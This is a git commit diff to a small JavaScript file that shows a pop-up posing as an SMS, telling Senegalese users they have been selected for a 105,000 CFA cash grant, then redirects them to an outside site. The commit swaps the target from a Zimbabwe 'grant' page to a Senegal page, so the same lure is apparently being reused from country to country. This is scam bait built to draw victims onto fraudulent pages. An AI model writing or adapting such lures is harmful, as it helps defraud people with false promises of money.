d897f987ef80cc4285829ebd4d5de0294f0b9755
ekperikpe <ekperikpe588@gmail.com>
2025-08-14 06:23:33 +0100

    Update senegal-active.js

--- senegal-active.js
+++ senegal-active.js
@@ -1,5 +1,5 @@
 var password = 'RETIRER 105 000 CFA'
 password=prompt('SMS: Félicitations, vous faites partie des Sénégalais sélectionnés pour recevoir une subvention en espèces de 105 000 CFA. Appuyez sur OK pour retirer maintenant ','RETIRER 105 000 CFA');
 if (password != 'RETIRER 105 000 CFA') {
-location.href='https://sureplug.org/zimbabwe-grant';
+location.href='https://sharpupdate.org/senegal.html';
 }
